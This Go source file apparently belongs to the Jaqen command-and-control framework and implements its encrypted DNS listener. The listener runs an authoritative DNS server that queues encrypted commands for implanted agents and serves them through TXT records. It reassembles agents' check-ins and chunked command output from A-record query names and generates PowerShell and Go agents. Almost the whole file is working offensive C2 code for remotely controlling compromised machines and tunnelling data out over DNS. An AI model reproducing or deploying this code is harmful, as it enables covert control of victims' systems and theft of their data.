package encryptedDNSListener

import (
	"encoding/base64"
	"errors"
	"fmt"
	"go/build"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"

	"github.com/c-sto/Jaqen/libJaqen/server"
	"github.com/c-sto/Jaqen/libJaqen/server/util"
)

var cm dnsCommandManager

type JaqenEncryptedDNSListener struct {
	running         bool
	options         map[string]string
	optionsMut      *sync.RWMutex
	dnsCheckinChan  chan dnsresponse
	dnsResponseChan chan dnsresponse
	closeChan       chan struct{}
	CheckinChan     chan server.Checkin
	ResponseChan    chan server.Command
	pendingCommands map[string][]string
	pcMut           *sync.RWMutex
	server          *dns.Server
}

func (d JaqenEncryptedDNSListener) GetName() string {
	return "secure-dns"
}

func (d *JaqenEncryptedDNSListener) Kill(agent string) {
	d.SendCommand(agent, "exit")
}

func popArray(sa []string, key []byte) ([]string, string) {
	if len(sa) < 1 {
		nc, _ := util.EncryptStringToHex("NoCMD", key)
		return sa, nc
	}
	r := sa[0]
	return sa[1:], r
}

func (d *JaqenEncryptedDNSListener) SendCommand(agent, command string) {
	//get byte slice of key
	ec, e := d.GetOption("key")
	if e != nil {
		fmt.Println(e)
		return
	}
	k, e := base64.StdEncoding.DecodeString(ec)
	if e != nil {
		fmt.Println(e)
		return
	}
	command, e = util.EncryptStringToHex(command, k)
	if e != nil {
		fmt.Println(e)
		return
	}

	d.pcMut.Lock()
	defer d.pcMut.Unlock()

	d.pendingCommands[agent] = append(d.pendingCommands[agent], command)
}

func (d *JaqenEncryptedDNSListener) Stop() {
	close(d.closeChan)
	d.server.Shutdown()
	d.running = false

}

func (d *JaqenEncryptedDNSListener) Init() (server.SignalChans, error) {
	x := new(sync.RWMutex)
	key, e := util.GenerateRandomBytes(32)
	if e != nil {
		return server.SignalChans{}, e
		//todo: log an error
	}
	d.optionsMut = x
	d.options = make(map[string]string)
	d.pendingCommands = make(map[string][]string)
	d.pcMut = &sync.RWMutex{}
	d.dnsCheckinChan = make(chan dnsresponse, 200)

	d.CheckinChan = make(chan server.Checkin, 10)
	d.ResponseChan = make(chan server.Command, 10)
	d.options["domain"] = ""
	d.options["split"] = "60"
	d.options["checkintime"] = "10000"
	d.options["exectime"] = "10000"
	d.options["key"] = base64.StdEncoding.EncodeToString(key)
	fmt.Println("DNS C2 Key: ", base64.StdEncoding.EncodeToString(key))

	d.options["cgo"] = "0"
	d.options["goos"] = build.Default.GOOS // os.Getenv("GOOS")
	d.options["goarch"] = build.Default.GOARCH
	d.options["goroot"] = build.Default.GOROOT
	d.options["gopath"] = build.Default.GOPATH
	d.options["outfile"] = ""

	r := server.SignalChans{
		CheckinChan:  d.CheckinChan,
		ResponseChan: d.ResponseChan,
	}

	cm = dnsCommandManager{}
	cm.Init()

	d.closeChan = make(chan struct{})

	d.running = false

	return r, nil
}

func (d *JaqenEncryptedDNSListener) GetOptions() func(string) []string {
	d.optionsMut.RLock()
	defer d.optionsMut.RUnlock()
	return func(line string) []string {
		a := make([]string, 0)
		for k, _ := range d.options { //other options go here?
			a = append(a, k)
		}
		return a
	}
}

func (d *JaqenEncryptedDNSListener) GetOption(s string) (string, error) {
	d.optionsMut.RLock()
	defer d.optionsMut.RUnlock()
	if x, ok := d.options[s]; ok {
		return x, nil
	}
	return "", errors.New("Option not found")
}

func (d *JaqenEncryptedDNSListener) SetOption(key, value string) {
	d.optionsMut.Lock()
	defer d.optionsMut.Unlock()
	d.options[key] = value
}

func (d *JaqenEncryptedDNSListener) Start() error {

	d.server = d.dothething()
	d.closeChan = make(chan struct{})
	go d.monitorCheckins(d.closeChan)
	fmt.Println("Started DNS Listener")
	d.running = true
	return nil
}

func (d *JaqenEncryptedDNSListener) monitorCheckins(quit chan struct{}) {
	for {
		select {
		case _, ok := <-quit:
			if !ok {
				return
			}
		case x := <-d.dnsCheckinChan:
			d.CheckinChan <- server.Checkin{
				UID:          x.UID,
				ListenerName: d.GetName(),
				CheckinTime:  time.Now(),
			}

		}
	}
}

func (d *JaqenEncryptedDNSListener) dothething() *dns.Server {
	uuidChan := make(chan string, 20)
	d.optionsMut.RLock()
	domain := d.options["domain"] //maybe allow multiple? idk
	d.optionsMut.RUnlock()

	dns.HandleFunc(domain+".", func(w dns.ResponseWriter, r *dns.Msg) { d.handleDNS(w, r, "127.0.0.1", uuidChan, domain) })

	// start DNS server
	server := &dns.Server{Addr: "0.0.0.0" + ":53", Net: "udp"}
	go func() {
		err := server.ListenAndServe()

		if err != nil {
			fmt.Println("Server error: ", err)
		}
		defer d.Stop()
	}()
	return server
}

func (j *JaqenEncryptedDNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg, EXT_IP string, uuidChan chan string, domain string) {
	// many thanks to the original author of this function
	m := &dns.Msg{
		Compress: false,
	}
	m.SetReply(r)
	m.Authoritative = true
	m.RecursionAvailable = true
	j.parseDNS(m, w.RemoteAddr().String(), EXT_IP, uuidChan, domain)
	w.WriteMsg(m)
}

func (j *JaqenEncryptedDNSListener) parseDNS(m *dns.Msg, ipaddr string, EXT_IP string, uuidChan chan string, domain string) {
	// for each DNS question to our nameserver
	// there can be multiple questions in the question section of a single request
	for _, q := range m.Question {
		//received a A request (probably a client returning a response, or checking in)
		if q.Qtype == dns.TypeA {
			//todo:all of these should be encapsulated in an encrypted blob
			//<payload>.<chunknumber>.<maxmessagechunks>.<cmdid>.<uid>.<c2.domain.here.please>
			//working backwards in this function intentionally.
			//Trying to decide if recursion shoudl be used to use the whole 200 char space of dns names for large payloads
			z := strings.Split(q.Name, ".")
			if len(z) < len(strings.Split(domain, ".")) { //todo: allow multiple domains
				continue
			}
			z = z[:len(z)-(len(strings.Split(domain, "."))+1)]
			if len(z) != 5 && len(z) != 1 {
				fmt.Println("oh boy")
				continue
			}
			//last value is the uid of the command
			uid := z[len(z)-1]
			if len(z) == 5 {
				//next is cmdid
				cmdID := z[len(z)-2]
				//next is the max chunks
				maxChunks := z[len(z)-3]
				//then the chunk being sent
				thisChunk := z[len(z)-4]
				//and finally our payload
				payloads := z[:len(z)-4]
				payload := strings.Join(payloads, "")

				cm.UpdateCmd(cmdID, maxChunks, thisChunk, payload)
				//check if cmd done
				if cm.IsDone(cmdID) {
					j.ResponseChan <- server.Command{
						UID:      uid,
						Cmd:      cm.GetCommand(cmdID).Command,
						Response: []byte(cm.GetCommand(cmdID).Response.ReadResposne()),
					}
					cm.ClearCommand(cmdID)
					//j.dnsResponseChan <- cm.GetCommand(cmdID).Response
				}
			} else {
				j.dnsCheckinChan <- dnsresponse{UID: uid}
			}
			r := dns.A{}
			r.Hdr = dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    10,
			}
			r.A = net.ParseIP("127.0.0.1") //can probably use this to signal good/bad
			rr, _ := dns.NewRR(r.String())
			m.Answer = append(m.Answer, rr)
		}
		//received a TXT request (probably a client looking for commands)
		if q.Qtype == dns.TypeTXT {
			//check if we have a pending command to send
			z := strings.Split(q.Name, ".")
			//cmdid.uid.c2.domain.here.please
			if len(z) < len(strings.Split(domain, ".")) {
				continue
			}
			z = z[:len(z)-(len(strings.Split(domain, "."))+1)]
			//uuid := z[len(z)-1]

			if len(z) < 2 {
				continue
			}

			uid := z[len(z)-1]
			//next is the cmdid
			cmdid := z[len(z)-2]

			//set agent cmdID
			r := dns.TXT{}
			r.Hdr = dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    10,
			}
			//get key used for cmd
			ek, _ := j.GetOption("key")
			//decode key
			dk, _ := base64.StdEncoding.DecodeString(ek)

			//get command to send the agent
			j.pcMut.Lock()
			newArr, cmd := popArray(j.pendingCommands[uid], dk)
			j.pendingCommands[uid] = newArr
			j.pcMut.Unlock()

			decCmd, _ := util.DecryptHexStringToString(cmd, dk)

			r.Txt = []string{cmd}

			rr, _ := dns.NewRR(r.String())
			m.Answer = append(m.Answer, rr)

			if decCmd != "NoCMD" {

				//add to command manager
				c := dnsCommand{
					Command:  decCmd,
					UID:      cmdid,
					Response: dnsresponse{Key: dk},
				}
				cm.AddCommand(c)
				uuidChan <- uid
			} else {
				//cm.SetCommandToSend("NoCMD")
			}
		}
	}
}

func (t JaqenEncryptedDNSListener) GetInfo() server.ListenerInfo {

	//copy the options map to avoid bad stuff
	t.optionsMut.Lock()
	newMap := make(map[string]string)
	for k, v := range t.options {
		newMap[k] = v
	}
	t.optionsMut.Unlock()

	return server.ListenerInfo{
		Name:    t.GetName(),
		Running: t.running,
		Options: newMap,
	}
}

func (t JaqenEncryptedDNSListener) GenerateAgentFormats() []string {
	return []string{
		"powershell",
		"golang",
		//"bash",
	}
}

func (t JaqenEncryptedDNSListener) Generate(s string) []byte {
	switch strings.ToLower(s) {
	case "powershell":
		return []byte(t.genPowershellAgent())
	case "golang":
		return t.genGolangAgent()
		//case "bash":
		//return []byte(t.genBashAgent())
	}
	return []byte{}
}
